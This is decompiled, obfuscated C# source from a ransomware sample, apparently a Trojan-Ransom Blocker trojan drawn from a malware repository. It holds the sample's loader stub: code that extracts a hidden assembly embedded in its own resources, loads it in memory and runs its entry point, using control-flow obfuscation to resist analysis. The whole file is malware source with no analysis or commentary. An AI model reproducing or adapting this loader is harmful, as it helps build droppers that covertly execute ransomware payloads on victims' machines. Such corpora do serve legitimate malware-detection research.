// Decompiled with JetBrains decompiler
// Type: ?1?.?2?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6B47CE0B-CA70-47B2-88AA-28518F14D243
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.chmc-3b9d973aba8141deb099278e50da424bc8c188e37cb4e02c90ee1cb062e20688.exe

using \u003F1\u003F;
using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Windows.Forms;

namespace \u003F1\u003F
{
  internal static class \u003F2\u003F
  {
    private static Assembly \u003F6\u003F(Package _param0, string _param1)
    {
      Uri uri = new Uri(_param1, UriKind.Relative);
      Stream stream = \u003F2\u003F.\u003F8\u003F(\u003F3\u003F.\u003F6\u003F.\u003F1\u003F(_param0, uri, 429, 491), 696, 663);
      byte[] numArray;
      try
      {
        numArray = new byte[(int) \u003F3\u003F.\u003F4\u003F.\u003F3\u003F(stream, 744, 683)];
        \u003F3\u003F.\u003F6\u003F.\u003F2\u003F(stream, numArray, 0, numArray.Length, 83, 115);
      }
      finally
      {
        int num = 2;
        while (true)
        {
          switch (num)
          {
            case 1:
            case 3:
              goto label_6;
            case 4:
              goto label_5;
            default:
              num = stream == null ? 3 : 4;
              continue;
          }
        }
label_5:
        stream.Dispose();
label_6:;
      }
      int num1 = 4;
      Assembly assembly;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            goto label_11;
          case 1:
            num1 = (object) assembly != null ? 3 : 0;
            continue;
          case 3:
            goto label_12;
          default:
            assembly = \u003F3\u003F.\u003F4\u003F.\u003F8\u003F(numArray, 434, 466);
            goto case 1;
        }
      }
label_11:
      throw new ArgumentException(\u003F3\u003F.\u003F6\u003F.\u003F4\u003F(794923304, 4) + _param1);
label_12:
      return assembly;
    }

    [STAThread]
    private static void \u003F3\u003F(string[] _param0)
    {
      \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F8\u003F();
      try
      {
        switch (0)
        {
          default:
            // ISSUE: type reference
            Stream stream = \u003F3\u003F.\u003F4\u003F.\u003F6\u003F(\u003F3\u003F.\u003F4\u003F.\u003F2\u003F(\u003F3\u003F.\u003F4\u003F.\u003F7\u003F(__typeref (\u003F2\u003F), 296, 369), 315, 371), \u003F3\u003F.\u003F6\u003F.\u003F4\u003F(794923313, 1), 455, 504);
            try
            {
              switch (0)
              {
                default:
                  Package package = \u003F3\u003F.\u003F4\u003F.\u003F9\u003F(stream, FileMode.Open, FileAccess.Read, 784, 893);
                  try
                  {
                    Assembly assembly;
                    switch (1)
                    {
                      case 2:
                        \u003F3\u003F.\u003F2\u003F((MethodBase) \u003F3\u003F.\u003F1\u003F(assembly, 110, 3), (object) null, new object[0], 657, 743);
                        break;
                      default:
                        assembly = \u003F2\u003F.\u003F6\u003F(package, \u003F3\u003F.\u003F6\u003F.\u003F4\u003F(794923273, 1));
                        goto case 2;
                    }
                  }
                  finally
                  {
                    int num = 5;
                    while (true)
                    {
                      switch (num)
                      {
                        case 2:
                          goto label_11;
                        case 3:
                          goto label_12;
                        default:
                          num = package == null ? 3 : 2;
                          continue;
                      }
                    }
label_11:
                    ((IDisposable) package).Dispose();
label_12:;
                  }
                  switch (1)
                  {
                  }
                  break;
              }
            }
            finally
            {
              int num = 0;
              while (true)
              {
                switch (num)
                {
                  case 1:
                  case 3:
                  case 4:
                    goto label_19;
                  case 2:
                  case 5:
                    goto label_18;
                  default:
                    num = stream == null ? 4 : 2;
                    continue;
                }
              }
label_18:
              stream.Dispose();
label_19:;
            }
            switch (2)
            {
            }
            break;
        }
      }
      catch (Exception ex)
      {
        string[] strArray = new string[5]
        {
          \u003F3\u003F.\u003F6\u003F.\u003F3\u003F((MemberInfo) \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F2\u003F(ex, 990, 968), 660, 690),
          null,
          null,
          null,
          null
        };
        int num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
              strArray[3] = \u003F3\u003F.\u003F6\u003F.\u003F4\u003F(794923293, 3);
              strArray[4] = ex.StackTrace;
              goto case 2;
            case 1:
              goto label_32;
            case 2:
              num1 = 1;
              continue;
            case 5:
              num1 = 4;
              continue;
            default:
              strArray[1] = \u003F3\u003F.\u003F6\u003F.\u003F4\u003F(794923292, 2);
              strArray[2] = ex.Message;
              goto case 5;
          }
        }
label_32:
        int num2 = (int) MessageBox.Show(string.Concat(strArray));
      }
      switch (0)
      {
      }
    }

    internal static Stream \u003F8\u003F([In] PackagePart obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 47:
          num1 = 6;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
          case 5:
            goto label_3;
          case 2:
            num2 = 5;
            continue;
          case 4:
          case 6:
            goto label_8;
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F2\u003F.\u003F8\u003F);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.GetStream();
    }

    internal static string \u003F4\u003F([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 5)
      {
        case 0:
          return obj0.ToString() + obj1;
        default:
          goto label_0;
      }
    }

    internal static AppDomain \u003F1\u003F([In] int obj0, [In] int obj1)
    {
label_0:
      switch ((obj1 ^ obj0) - 67)
      {
        case 0:
          return AppDomain.CurrentDomain;
        default:
          goto label_0;
      }
    }

    internal static void \u003F9\u003F(
      [In] AppDomain obj0,
      [In] string obj1,
      [In] object obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_0:
      switch ((obj4 ^ obj3) - 67)
      {
        case 0:
          obj0.SetData(obj1, obj2);
          break;
        default:
          goto label_0;
      }
    }

    internal static int \u003F2\u003F(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 22)
      {
        case 0:
          return obj0.Read(obj1, obj2, obj3);
        case 1:
          return obj0.Read(obj1, obj2, obj3);
        default:
          goto label_0;
      }
    }

    internal static Evidence \u003F7\u003F([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 15)
      {
        case 0:
          return obj0.Evidence;
        default:
          goto label_0;
      }
    }
  }
}
